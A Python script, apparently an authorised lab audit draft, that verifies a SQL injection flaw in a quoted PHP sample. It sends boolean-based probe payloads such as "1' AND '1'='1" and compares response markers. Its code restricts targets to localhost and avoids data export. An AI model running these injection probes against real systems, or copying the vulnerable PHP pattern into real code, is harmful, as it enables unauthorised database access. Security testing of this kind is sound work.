#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""SQLI-001 local verification draft (authorized lab only).

Normalized sample (local 1-based line numbers):
  L8   $id=$_GET['id'];
  L14  $sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
  L15  $result=mysql_query($sql);
  L28  print_r(mysql_error());

Only http(s) to localhost / 127.0.0.1 / ::1 is accepted; redirects are
refused. The script never enumerates schemas or exports table data: it
only reports which fixed markers appear in the response.
"""
import argparse
import http.cookiejar
import sys
import urllib.error
import urllib.parse
import urllib.request

ALLOWED_HOSTS = {"localhost", "127.0.0.1", "::1"}

MARKERS = {
    "row": "Your Login name:",
    "row_pw": "Your Password:",
    "need_id": "Please input the ID as parameter with numeric value",
    "sql_error": "You have an error in your SQL syntax",
    "php_undefined": "Call to undefined function",
    "fetch_warning": "supplied argument is not a valid MySQL",
}


class NoRedirect(urllib.request.HTTPRedirectHandler):
    """Refuse redirects so a lab response cannot bounce to another host."""

    def redirect_request(self, req, fp, code, msg, headers, newurl):
        raise urllib.error.HTTPError(
            req.full_url, code, "redirect refused: " + str(newurl), headers, fp
        )


def build_opener(session_file):
    handlers = [NoRedirect()]
    if session_file:
        jar = http.cookiejar.MozillaCookieJar(session_file)
        jar.load(ignore_discard=True, ignore_expires=True)
        handlers.append(urllib.request.HTTPCookieProcessor(jar))
    return urllib.request.build_opener(*handlers)


def target_url(base_url, path):
    parts = urllib.parse.urlsplit(base_url)
    if parts.scheme not in ("http", "https"):
        raise SystemExit("base-url must use http or https")
    host = (parts.hostname or "").strip("[]")
    if host not in ALLOWED_HOSTS:
        raise SystemExit("refusing non-local host: %r" % host)
    if not path.startswith("/"):
        raise SystemExit("path must start with '/': %r" % path)
    return urllib.parse.urlunsplit((parts.scheme, parts.netloc, path, "", ""))


def fetch(opener, url, timeout):
    request = urllib.request.Request(
        url, headers={"User-Agent": "sqli-001-lab-draft/1.0"}
    )
    try:
        with opener.open(request, timeout=timeout) as response:
            body = response.read().decode("utf-8", "replace")
            return response.getcode(), body, None
    except urllib.error.HTTPError as exc:
        body = exc.read().decode("utf-8", "replace") if exc.fp else ""
        return exc.code, body, "http_error"
    except (urllib.error.URLError, OSError) as exc:
        return None, "", "connection_error: %s" % exc


def run_case(opener, url, param, value, timeout):
    query = urllib.parse.urlencode({param: value})
    status, body, error = fetch(opener, url + "?" + query, timeout)
    hits = {name: (marker in body) for name, marker in MARKERS.items()}
    return {"status": status, "error": error, "length": len(body), "markers": hits}


def main():
    parser = argparse.ArgumentParser(
        description="SQLI-001 local SQL injection verification draft"
    )
    parser.add_argument("--base-url", required=True,
                        help="e.g. http://127.0.0.1:8080")
    parser.add_argument("--path", required=True,
                        help="deployed path of the audited PHP file, e.g. /lab/index.php")
    parser.add_argument("--param", default="id",
                        help="GET parameter taken from the code (default: id)")
    parser.add_argument("--session-file", default=None,
                        help="optional Netscape-format cookie file for an outer login")
    parser.add_argument("--timeout", type=float, default=10.0)
    args = parser.parse_args()

    url = target_url(args.base_url, args.path)
    opener = build_opener(args.session_file)

    cases = [
        ("baseline", "1"),
        ("syntax_probe", "1'"),
        ("bool_true", "1' AND '1'='1"),
        ("bool_false", "1' AND '1'='2"),
    ]

    results = {}
    for label, value in cases:
        results[label] = run_case(opener, url, args.param, value, args.timeout)
        item = results[label]
        print("[%s] status=%s len=%s error=%s" % (
            label, item["status"], item["length"], item["error"]))
        for name, present in item["markers"].items():
            if present:
                print("    marker: %s" % name)
        sys.stdout.flush()

    print("")
    print("comparison:")
    print("  baseline_row=%s bool_true_row=%s bool_false_row=%s" % (
        results["baseline"]["markers"]["row"],
        results["bool_true"]["markers"]["row"],
        results["bool_false"]["markers"]["row"]))
    print("  syntax_probe_sql_error=%s" % (
        results["syntax_probe"]["markers"]["sql_error"],))
    print("  syntax_probe_php_undefined=%s" % (
        results["syntax_probe"]["markers"]["php_undefined"],))
    print("")
    print("Interpretation guide (draft; not an execution claim):")
    print("  - undefined mysql_* functions mean the PHP runtime is incompatible,")
    print("    not that the input is safe.")
    print("  - an http_error with a 30x code means the request was redirected")
    print("    (login/auth); adapt --session-file and --path before concluding.")
    print("  - a difference in row presence between bool_true and bool_false is")
    print("    the semantic change to report; do not export table contents.")


if __name__ == "__main__":
    main()
